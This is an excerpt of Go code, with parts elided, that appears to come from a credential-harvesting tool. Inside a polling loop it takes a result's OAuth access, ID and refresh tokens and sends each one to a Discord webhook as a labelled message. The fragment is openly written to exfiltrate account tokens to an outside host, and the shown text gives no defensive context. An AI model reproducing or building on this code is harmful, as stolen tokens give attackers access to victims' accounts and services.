	...
	for {
		...
		if result != nil {
			...
			if discordWebhook != "" {
				...
				// Send each token separately with a clear label
				sendDiscordMessage(fmt.Sprintf("=== AccessToken ===\n%s", result.AccessToken))
				time.Sleep(1 * time.Second) // Delay between messages
				
				sendDiscordMessage(fmt.Sprintf("=== IdToken ===\n%s", result.IdToken))
				time.Sleep(1 * time.Second)
				
				sendDiscordMessage(fmt.Sprintf("=== RefreshToken ===\n%s", result.RefreshToken))
			} else {
